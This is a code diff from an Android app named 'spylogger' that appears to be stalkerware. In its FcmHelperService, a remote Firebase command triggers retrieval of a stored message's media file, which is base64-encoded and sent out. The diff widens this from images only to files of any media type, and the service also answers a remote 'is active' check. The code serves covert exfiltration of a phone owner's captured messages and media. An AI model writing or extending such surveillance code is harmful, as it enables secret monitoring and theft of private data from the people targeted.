@@ -4,7 +4,6 @@ import android.content.Context;
 import android.util.Log;
 
 import com.gravatasufoca.spylogger.model.Mensagem;
-import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
 import com.gravatasufoca.spylogger.utils.Utils;
@@ -37,8 +36,8 @@ public class FcmHelperService {
 
     public void executar() {
         switch (fcmMessageVO.getTipoAcao()) {
-            case RECUPERAR_IMAGEM:
-                enviarImagem();
+            case RECUPERAR_ARQUIVO:
+                enviarArquivo();
                 break;
             case ESTA_ATIVO:
                 sendArquivoService.enviar(envioArquivoVO);
@@ -48,14 +47,14 @@ public class FcmHelperService {
         }
     }
 
-    private File recuperarImagem(){
+    private File recuperarArquivo(){
         try {
             RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
             Mensagem mensagem = repositorioMensagem.obterPorId(fcmMessageVO.getId());
 
             if (mensagem != null) {
                 return Utils.getMediaFile(
-                        TipoMidia.IMAGEM,
+                        mensagem.getTipoMidia(),
                         mensagem.getTamanhoArquivo(),
                         mensagem.getDataRecebida(), 1);
             }
@@ -66,8 +65,8 @@ public class FcmHelperService {
         return null;
     }
 
-    private void enviarImagem() {
-        File file=recuperarImagem();
+    private void enviarArquivo() {
+        File file= recuperarArquivo();
         if(file!=null){
             envioArquivoVO.setId(fcmMessageVO.getId());
             envioArquivoVO.setArquivo(Utils.encodeBase64(file));
